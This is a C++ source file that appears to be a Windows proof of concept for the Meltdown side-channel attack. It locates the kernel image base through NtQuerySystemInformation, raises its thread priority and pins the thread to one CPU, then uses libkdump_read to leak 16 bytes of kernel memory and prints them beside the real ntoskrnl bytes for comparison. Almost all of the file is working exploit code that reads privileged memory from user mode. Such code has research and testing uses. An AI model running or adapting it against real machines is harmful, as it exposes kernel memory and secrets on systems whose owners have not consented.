#include "stdafx.h"

#include "libkdump.h"

void hex_dump(gsl::span<std::byte> data, std::ostream& os, std::ptrdiff_t width) {
	const auto start = data.begin();
	const auto end = data.end();
	auto line = start;
	while(line != end) {
		os.width(4);
		os.fill('0');
		os << std::hex << line - start << ": ";
		const std::ptrdiff_t line_length = std::min(width, end - line);
		for(auto next = line; next != end && next != line + width; ++next) {
			const char ch = static_cast<char>(*next);
			os << (ch < 32 ? '.' : ch);
		}
		if(line_length != width) {
			os << std::string(gsl::narrow_cast<std::size_t>(width - line_length), ' ');
		}
		for(auto next = line; next != end && next != line + width; ++next) {
			const char ch = static_cast<char>(*next);
			os << " ";
			os.width(2);
			os.fill('0');
			os << std::hex << std::uppercase << static_cast<unsigned int>(static_cast<unsigned char>(ch));
		}
		os << std::endl;
		line = line + line_length;
	}
}

struct RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
};

#pragma warning(push)
#pragma warning(disable: 4200)
struct SYSTEM_MODULE_INFORMATION
{
	ULONG ModulesCount;
	RTL_PROCESS_MODULE_INFORMATION Modules[0];
};
#pragma warning(pop)

int main() {
	HANDLE output = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD mode = 0;
	::GetConsoleMode(output, &mode);
	mode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
	::SetConsoleMode(output, mode);

	// 0xfffff802'd6d62320  
	decltype(NtQuerySystemInformation)* ntQuerySystemInformation = reinterpret_cast<decltype(NtQuerySystemInformation)*>(
	                                                               reinterpret_cast<void*>(::GetProcAddress(::GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
	std::unique_ptr<std::byte[]> module_info;
	ULONG module_size = 1'024;
	do {
		module_size *= 2;
		module_info = std::make_unique<std::byte[]>(module_size);
	} while(STATUS_SUCCESS != ntQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(11), module_info.get(), module_size, nullptr));

	const SYSTEM_MODULE_INFORMATION* const mi = reinterpret_cast<SYSTEM_MODULE_INFORMATION*>(module_info.get());
	void* const kernel_base = mi->Modules[0].ImageBase;
	const ULONG kernel_size = mi->Modules[0].ImageSize;

	HMODULE ntoskrnl(::LoadLibraryW(L"ntoskrnl.exe"));
	auto f = gsl::finally([=]() { ::FreeLibrary(ntoskrnl); });

	//void* const target = reinterpret_cast<void*>(0xfffff802'd6d62320);
	void* const target = kernel_base;
	const std::uint64_t bytes_to_leak = 16;

	//MEMORY_BASIC_INFORMATION mbi = { 0 };
	//::VirtualQuery(kernel_base, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

	std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
	std::cout << "leaking " << target << std::endl;

	::SetPriorityClass(::GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	::SetThreadAffinityMask(::GetCurrentThread(), 0x1);
	::SetThreadPriority(::GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	libkdump_enable_debug(1);
	libkdump_config_t config = libkdump_get_autoconfig();
	libkdump_init(config);

	for(DWORD i = 0; i < bytes_to_leak; i++) {
		buffer[i] = libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(target) + i));
	}
	std::cout << "Leaked:" << std::endl;
	hex_dump(gsl::make_span(buffer.get(), bytes_to_leak), std::cout, 16);
	std::cout << std::endl;
	std::cout << "Actual:" << std::endl;
	hex_dump(gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl), bytes_to_leak), std::cout, 16);


	libkdump_cleanup();
	return 0;
}
